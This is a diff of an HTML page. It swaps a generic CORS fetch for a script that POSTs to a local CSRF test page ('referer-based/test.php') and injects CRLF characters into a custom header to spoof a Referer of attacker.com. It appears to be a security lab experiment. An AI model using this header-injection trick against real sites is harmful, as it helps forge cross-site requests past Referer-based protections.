@@ -59,27 +59,25 @@
     
     </script>
 
-    <script>
-        function createCORSRequest(method, url){
-    var xhr = new XMLHttpRequest();
-    if ("withCredentials" in xhr){
-        xhr.open(method, url, true);
-    } else if (typeof XDomainRequest != "undefined"){
-        xhr = new XDomainRequest();
-        xhr.open(method, url);
-    } else {
-        xhr = null;
-    }
-    return xhr;
-}
+<script>
 
-var request = createCORSRequest("get", "https://dtvott-abc.akamaized.net/dash_live_1057/manifest.mpd");
-if (request){
-    request.onload = function() {
-        // ...
-    };
-    request.onreadystatechange = handler;
-    request.send();
-}
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", 'http://localtest.me/CSRF/referer-based/test.php', true);
+    
+    
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    // Try CRLF to spoof referer
+    xhr.setRequestHeader("osef", "http://attacker.com%0D%0AReferer:%20attacker.com");
+    
+    xhr.onreadystatechange = function() { 
+        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+            console.log('Success ...');
+    
+        }
+    }
+    xhr.send("pwd=true&submit=y");
+    
+    
     </script>
 </html>
+
